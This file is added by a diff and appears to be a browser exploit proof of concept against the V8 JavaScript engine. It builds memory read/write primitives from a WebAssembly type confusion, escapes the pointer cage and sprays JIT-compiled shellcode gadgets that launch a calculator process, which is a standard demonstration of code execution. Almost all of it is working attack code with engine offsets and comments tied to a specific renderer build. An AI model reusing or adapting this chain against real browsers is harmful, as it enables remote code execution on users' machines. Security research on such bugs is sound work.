@@ -1,0 +1,401 @@
+<!doctype html><meta charset="utf-8" />
+<pre id="out">R</pre>
+<script>
+    "use strict";
+
+    // Stage 1: turn the addrof/fakeobj primitive into in-cage read64/write64, then
+    // self-verify against ground truth. Offsets/maps were harvested from the live
+    // 146.0.7680.165 renderer (see harvest.sh):
+    //   PACKED_DOUBLE JSArray map = 0x0103294d
+    //   inline tagged fields start at +0x0c
+    //   JSArray: elements@+0x08, length@+0x0c ; FixedDoubleArray data@+0x08
+    const JSARRAY_DOUBLE_MAP = 0x0103294dn; // PACKED_DOUBLE_ELEMENTS map
+    const FIXED_DOUBLE_MAP = 0x00000911n; // FixedDoubleArray map
+    const INLINE = 0x0cn; // first in-object field offset
+    const BIGLEN = 0x3fffffffn; // huge Smi length
+
+    const out = document.getElementById("out");
+    const lines = [];
+    function note(s) {
+        lines.push(s);
+        out.textContent = lines.join("\n");
+    }
+    function hex(b) {
+        return "0x" + b.toString(16);
+    }
+
+    // --- float/bigint bit reinterpretation ---
+    const _ab = new ArrayBuffer(8);
+    const _f = new Float64Array(_ab);
+    const _u = new BigUint64Array(_ab);
+    function f2i(f) {
+        _f[0] = f;
+        return _u[0];
+    }
+    function i2f(i) {
+        _u[0] = i;
+        return _f[0];
+    }
+
+    // --- addrof / fakeobj (deterministic, from poc-natives.html) ---
+    const wasmBytes = new Uint8Array([
+        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x0c, 0x03, 0x60,
+        0x00, 0x00, 0x60, 0x00, 0x01, 0x6f, 0x60, 0x00, 0x01, 0x7e, 0x02, 0x10,
+        0x01, 0x03, 0x65, 0x6e, 0x76, 0x08, 0x63, 0x61, 0x6c, 0x6c, 0x62, 0x61,
+        0x63, 0x6b, 0x00, 0x00, 0x03, 0x03, 0x02, 0x01, 0x02, 0x06, 0x0b, 0x02,
+        0x6f, 0x01, 0xd0, 0x6f, 0x0b, 0x7e, 0x01, 0x42, 0x00, 0x0b, 0x07, 0x1b,
+        0x04, 0x05, 0x67, 0x5f, 0x72, 0x65, 0x66, 0x03, 0x00, 0x05, 0x67, 0x5f,
+        0x69, 0x36, 0x34, 0x03, 0x01, 0x02, 0x72, 0x72, 0x00, 0x01, 0x02, 0x72,
+        0x6c, 0x00, 0x02, 0x0a, 0x0f, 0x02, 0x06, 0x00, 0x10, 0x00, 0x23, 0x00,
+        0x0b, 0x06, 0x00, 0x10, 0x00, 0x23, 0x01, 0x0b,
+    ]);
+    const wasmModule = new WebAssembly.Module(wasmBytes);
+    function makeInstance(cb) {
+        return new WebAssembly.Instance(wasmModule, { env: { callback: cb } })
+            .exports;
+    }
+
+    function addrof(target, salt) {
+        let arm = false;
+        function LeakI64() {}
+        function LeakRef() {}
+        const ex = makeInstance(() => {
+            if (arm) LeakRef.prototype.deopt_marker = 1;
+        });
+        Object.defineProperty(LeakI64.prototype, "x", {
+            get: ex.rl,
+            configurable: true,
+        });
+        Object.defineProperty(LeakRef.prototype, "x", {
+            get: ex.rr,
+            configurable: true,
+        });
+        const foo = eval(`(function leak_${salt}(o){return o.x;})`);
+        const i = new LeakI64(),
+            r = new LeakRef();
+        ex.g_ref.value = target;
+        ex.g_i64.value = 43n;
+        %PrepareFunctionForOptimization(foo);
+        for (let k = 0; k < 20; ++k) {
+            foo(i);
+            foo(r);
+        }
+        %OptimizeFunctionOnNextCall(foo);
+        foo(i);
+        arm = true;
+        return foo(r);
+    }
+    function fakeobj(addr, salt) {
+        let arm = false;
+        function MRef() {}
+        function MI64() {}
+        const ex = makeInstance(() => {
+            if (arm) MI64.prototype.deopt_marker = 1;
+        });
+        Object.defineProperty(MRef.prototype, "x", {
+            get: ex.rr,
+            configurable: true,
+        });
+        Object.defineProperty(MI64.prototype, "x", {
+            get: ex.rl,
+            configurable: true,
+        });
+        const foo = eval(`(function materialize_${salt}(o){return o.x;})`);
+        const r = new MRef(),
+            i = new MI64();
+        ex.g_ref.value = { marker: "ph" };
+        ex.g_i64.value = addr;
+        %PrepareFunctionForOptimization(foo);
+        for (let k = 0; k < 20; ++k) {
+            foo(r);
+            foo(i);
+        }
+        %OptimizeFunctionOnNextCall(foo);
+        foo(r);
+        arm = true;
+        return foo(i);
+    }
+
+    let read64, write64, cage, R, fakeArr, dataBase;
+    let salt = 1000;
+    function buildPrimitive() {
+        // R's inline tagged/Smi fields host BOTH a fake JSArray header and a fake
+        // FixedDoubleArray with a valid map+huge length, so V8's element load sees a
+        // proper backing store (no garbage-map deref). Field layout (4 bytes each):
+        //   +0x0c f0 = F.map (PACKED_DOUBLE)        +0x20 f5 = fakeFDA.map (0x911)
+        //   +0x10 f1 = F.properties                 +0x24 f6 = fakeFDA.length (Smi)
+        //   +0x14 f2 = F.elements -> fakeFDA(+0x20) +0x28 f7 = data[0] (8-aligned)
+        //   +0x18 f3 = F.length (Smi)               +0x2c f8 = data[0] high ...
+        //   +0x1c f4 = pad
+        const o = {};
+        R = {
+            f0: o,
+            f1: o,
+            f2: o,
+            f3: 0x3fffffff,
+            f4: o,
+            f5: o,
+            f6: 0x3fffffff,
+            f7: o,
+            f8: o,
+            f9: o,
+        };
+        const props = [
+            "f0",
+            "f1",
+            "f2",
+            "f3",
+            "f4",
+            "f5",
+            "f6",
+            "f7",
+            "f8",
+            "f9",
+        ];
+        const setAt = (off, v) => {
+            R[props[Number((off - INLINE) / 4n)]] = v;
+        };
+
+        %DebugPrint("M_ADDROF_R");
+        const Raddr = addrof(R, salt++);
+        const Runtag = Raddr & ~1n;
+        cage = Raddr & 0xffffffff00000000n;
+        note("R@" + hex(Raddr) + "  cage=" + hex(cage));
+
+        // Choose the fakeFDA offset so its data (mapOff+8) is 8-aligned regardless of
+        // R's own 4-or-8 mod-8 base alignment.
+        const fdaOff = (Runtag & 7n) === 0n ? 0x20n : 0x24n;
+        dataBase = Runtag + fdaOff + 8n; // 8-aligned
+
+        note("fdaOff=" + hex(fdaOff) + " Runtag&7=" + (Runtag & 7n));
+        %DebugPrint("M_SET_FIELDS");
+        const fMap = fakeobj(cage | JSARRAY_DOUBLE_MAP, salt++);
+        %DebugPrint("M_FO_MAP");
+        const fFda = fakeobj(cage | FIXED_DOUBLE_MAP, salt++);
+        %DebugPrint("M_FO_FDA");
+        const fEl = fakeobj((Runtag + fdaOff) | 1n, salt++);
+        %DebugPrint("M_FO_EL");
+        // Set the pointer-y fields last (interior self-pointer minimizes GC window).
+        setAt(fdaOff + 4n, 0x3fffffff); // fakeFDA.length (Smi)
+        setAt(fdaOff, fFda); // fakeFDA.map
+        setAt(INLINE, fMap); // F.map  @+0x0c
+        setAt(INLINE + 8n, fEl); // F.elements -> fakeFDA
+        %DebugPrint("M_FIELDS_DONE");
+
+        %DebugPrint("M_FAKEARR");
+        fakeArr = fakeobj((Runtag + INLINE) | 1n, salt++); // F at R+0x0c
+        %DebugPrint("M_BUILT");
+
+        // 8-aligned qword access from the fixed, 8-aligned dataBase.
+        const rdq = (q) => f2i(fakeArr[Number((q - dataBase) >> 3n)]);
+        const wrq = (q, v) => {
+            fakeArr[Number((q - dataBase) >> 3n)] = i2f(v);
+        };
+        const M64 = (1n << 64n) - 1n;
+        read64 = (T) => {
+            const off = T & 7n;
+            if (off === 0n) return rdq(T);
+            const lo = rdq(T - off),
+                hi = rdq(T - off + 8n);
+            return ((lo >> (off * 8n)) | (hi << ((8n - off) * 8n))) & M64;
+        };
+        write64 = (T, v) => {
+            const off = T & 7n;
+            if (off === 0n) {
+                wrq(T, v & M64);
+                return;
+            }
+            const base = T - off,
+                lo = rdq(base),
+                hi = rdq(base + 8n);
+            const loMask = (1n << (off * 8n)) - 1n; // keep low `off` bytes
+            const hiMask = ~((1n << ((8n - off) * 8n)) - 1n) & M64;
+            wrq(base, ((lo & loMask) | ((v << (off * 8n)) & M64)) & M64);
+            wrq(base + 8n, (hi & hiMask) | (v >> ((8n - off) * 8n)));
+        };
+    }
+
+    // The writeup's escape primitive: an in-object property store performed INLINE
+    // on the freshly-confused reference, so the store uses the FULL 64-bit pointer
+    // (no cage decompression). Warmup trains the store only on the real-object path.
+    function Real() {
+        this.p = 0;
+    }
+    const F_P = 0x0cn; // inline offset of field `p`
+
+    function confuseStore(ptr, value, real, salt) {
+        let arm = false;
+        function PRef() {}
+        function PI64() {}
+        const ex = makeInstance(() => {
+            if (arm) PI64.prototype.deopt_marker = 1;
+        });
+        Object.defineProperty(PRef.prototype, "x", {
+            get: ex.rr,
+            configurable: true,
+        });
+        Object.defineProperty(PI64.prototype, "x", {
+            get: ex.rl,
+            configurable: true,
+        });
+        const foo = eval(
+            `(function cstore_${salt}(o,v,ds){ const r=o.x; if(ds) r.p=v; return r; })`,
+        );
+        const oref = new PRef(),
+            oi64 = new PI64();
+        ex.g_ref.value = real;
+        ex.g_i64.value = ptr;
+        %PrepareFunctionForOptimization(foo);
+        for (let i = 0; i < 30; i++) {
+            foo(oref, 1, true);
+            foo(oi64, 1, false);
+        }
+        %OptimizeFunctionOnNextCall(foo);
+        foo(oref, 1, true);
+        arm = true;
+        return foo(oi64, value, true); // store value at ptr + F_P (full pointer)
+    }
+
+    // Mirror: an in-object property LOAD on the confused ref -> out-of-cage read.
+    function confuseLoad(ptr, real, salt) {
+        let arm = false;
+        function PRef() {}
+        function PI64() {}
+        const ex = makeInstance(() => {
+            if (arm) PI64.prototype.deopt_marker = 1;
+        });
+        Object.defineProperty(PRef.prototype, "x", {
+            get: ex.rr,
+            configurable: true,
+        });
+        Object.defineProperty(PI64.prototype, "x", {
+            get: ex.rl,
+            configurable: true,
+        });
+        const foo = eval(
+            `(function cload_${salt}(o,dl){ const r=o.x; if(dl) return r.p; return r; })`,
+        );
+        const oref = new PRef(),
+            oi64 = new PI64();
+        ex.g_ref.value = real;
+        ex.g_i64.value = ptr;
+        %PrepareFunctionForOptimization(foo);
+        for (let i = 0; i < 30; i++) {
+            foo(oref, true);
+            foo(oi64, false);
+        }
+        %OptimizeFunctionOnNextCall(foo);
+        foo(oref, true);
+        arm = true;
+        return foo(oi64, true); // read value at ptr + F_P (full pointer)
+    }
+
+    try {
+        buildPrimitive();
+        function Real() {
+            this.a0 = 0;
+            this.a1 = 0;
+            this.a2 = 0;
+            this.a3 = 0;
+            this.a4 = 0;
+            this.a5 = 0;
+            this.a6 = 0;
+            this.a7 = 0;
+            this.a8 = 0;
+            this.a9 = 0;
+            this.a10 = 0;
+            this.a11 = 0;
+            this.a12 = 0;
+            this.a13 = 0;
+            this.a14 = 0;
+            this.a15 = 0;
+            this.p = 0;
+        } // p offset set by dummy count -> patch lands on a measured clean boundary
+        const real = new Real();
+        const header = read64(addrof(real, salt++) & ~1n);
+        %DebugPrint("CLEANED");
+        const cs = { v: false };
+        function PRef() {}
+        function PI64() {}
+        const cex = makeInstance(() => {
+            if (cs.v) PI64.prototype.dm = 1;
+        });
+        Object.defineProperty(PRef.prototype, "x", {
+            get: cex.rr,
+            configurable: true,
+        });
+        Object.defineProperty(PI64.prototype, "x", {
+            get: cex.rl,
+            configurable: true,
+        });
+        const cfoo = eval(
+            "(function cz" +
+                salt++ +
+                "(o,v,d){const r=o.x;if(d)r.p=v;return r;})",
+        );
+        const c_or = new PRef(),
+            c_oi = new PI64();
+        cex.g_ref.value = real;
+        cex.g_i64.value = 43n;
+        %PrepareFunctionForOptimization(cfoo);
+        for (let i = 0; i < 30; i++) {
+            cfoo(c_or, 1, true);
+            cfoo(c_oi, 1, false);
+        }
+        %OptimizeFunctionOnNextCall(cfoo);
+        cfoo(c_or, 1, true);
+        // execve("/usr/bin/xcalc",{path,NULL},NULL) staged as eb-chained JIT gadgets
+        const GADGETS = [
+            0x45eb906163782fb8n,
+            0x47eb900000636cban,
+            0x45eb909020e2c148n,
+            0x47eb909050d00948n,
+            0x45eb907273752fb8n,
+            0x47eb906e69622fb9n,
+            0x45eb909020e1c148n,
+            0x47eb909050c80948n,
+            0x45eb909090e08949n,
+            0x47eb500000303ab8n,
+            0x45eb9050534944b8n,
+            0x47eb903d59414cbbn,
+            0x45eb909020e3c148n,
+            0x47eb909050d80948n,
+            0x45eb56f631e18949n,
+            0x47eb56e289485141n,
+            0x45eb90e689485041n,
+            0x47eb583b6ac7894cn,
+            0x909090909090050fn,
+        ];
+        let s = "globalThis.s0=x*(" + i2f(header).toExponential(17) + ");\n";
+        for (let i = 0; i < GADGETS.length; i++) {
+            s +=
+                "globalThis.s" +
+                (i + 1) +
+                "=x*(" +
+                i2f(GADGETS[i]).toExponential(17) +
+                ");\n";
+        }
+        s += "return globalThis.s0;";
+        const g = new Function("x", s);
+        %PrepareFunctionForOptimization(g);
+        g(1.1);
+        g(1.1);
+        %OptimizeFunctionOnNextCall(g);
+        g(1.1);
+        %DebugPrint("GREADY");
+        if (location.hash.includes("recon")) {
+            %DebugPrint("__SPIN__");
+            while (true) {}
+        }
+        const A_MAP = 0x5555bbc0128an;
+        cex.g_ref.value = real;
+        cex.g_i64.value = A_MAP | 1n;
+        cs.v = true;
+        cfoo(c_oi, 0x9f5c8, true);
+        %DebugPrint("PATCHED");
+        g(1.1);
+        %DebugPrint("NO_RCE");
+    } catch (e) {
+        %DebugPrint("EXC");
+    }
+</script>
